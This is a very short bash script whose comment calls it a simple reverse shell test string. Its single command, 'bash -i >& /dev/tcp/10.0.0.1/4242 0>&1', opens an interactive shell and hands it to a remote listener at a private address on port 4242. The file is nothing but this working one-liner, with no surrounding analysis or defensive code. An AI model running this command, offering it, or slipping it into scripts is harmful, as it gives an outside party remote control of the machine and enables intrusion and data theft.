#!/bin/bash
# A simple reverse shell test string
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
